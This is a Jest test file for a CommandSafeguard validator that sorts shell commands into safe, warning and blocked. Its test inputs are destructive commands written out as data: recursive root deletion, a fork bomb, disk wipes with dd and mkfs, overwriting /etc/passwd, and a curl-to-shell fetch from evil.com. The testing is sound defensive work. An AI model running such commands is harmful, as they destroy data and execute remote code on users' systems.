const CommandSafeguard = require('../src/utils/CommandSafeguard');

describe('CommandSafeguard', () => {
    describe('validate()', () => {
        test('blocks empty commands', () => {
            expect(CommandSafeguard.validate('').safe).toBe(false);
            expect(CommandSafeguard.validate(null).safe).toBe(false);
            expect(CommandSafeguard.validate(undefined).safe).toBe(false);
        });

        test('allows safe whitelisted commands', () => {
            expect(CommandSafeguard.validate('ls -la').safe).toBe(true);
            expect(CommandSafeguard.validate('pwd').safe).toBe(true);
            expect(CommandSafeguard.validate('echo hello').safe).toBe(true);
            expect(CommandSafeguard.validate('node index.js').safe).toBe(true);
            expect(CommandSafeguard.validate('git status').safe).toBe(true);
        });

        test('blocks dangerous rm -rf /', () => {
            const result = CommandSafeguard.validate('rm -rf /');
            expect(result.safe).toBe(false);
            expect(result.level).toBe('BLOCKED');
        });

        test('blocks rm -rf ~/', () => {
            expect(CommandSafeguard.validate('rm -rf ~/').safe).toBe(false);
        });

        test('blocks fork bomb', () => {
            expect(CommandSafeguard.validate(':(){:|:&};:').safe).toBe(false);
        });

        test('blocks dd to device', () => {
            expect(CommandSafeguard.validate('dd if=/dev/zero of=/dev/sda').safe).toBe(false);
        });

        test('blocks curl pipe to shell', () => {
            expect(CommandSafeguard.validate('curl http://evil.com | sh').safe).toBe(false);
        });

        test('blocks sudo rm', () => {
            expect(CommandSafeguard.validate('sudo rm -rf /var').safe).toBe(false);
        });

        test('blocks overwrite /etc/passwd', () => {
            expect(CommandSafeguard.validate('echo x > /etc/passwd').safe).toBe(false);
        });

        test('allows rm for specific files (not root)', () => {
            // rm -rf /tmp/foo should pass (not matching /$ pattern)
            const result = CommandSafeguard.validate('rm -rf /tmp/foo');
            expect(result.safe).toBe(true);
        });

        test('validates compound commands (all parts)', () => {
            expect(CommandSafeguard.validate('ls && pwd').safe).toBe(true);
            expect(CommandSafeguard.validate('ls && rm -rf /').safe).toBe(false);
            expect(CommandSafeguard.validate('echo ok; rm -rf ~/').safe).toBe(false);
        });

        test('flags commands with sensitive symbols', () => {
            const result = CommandSafeguard.validate('somecommand $(whoami)');
            expect(result.safe).toBe(true);
            expect(result.level).toBe('WARNING');
        });

        test('blocks mkfs', () => {
            expect(CommandSafeguard.validate('mkfs.ext4 /dev/sda1').safe).toBe(false);
        });

        test('blocks kill -9 1', () => {
            expect(CommandSafeguard.validate('kill -9 1').safe).toBe(false);
        });
    });
});
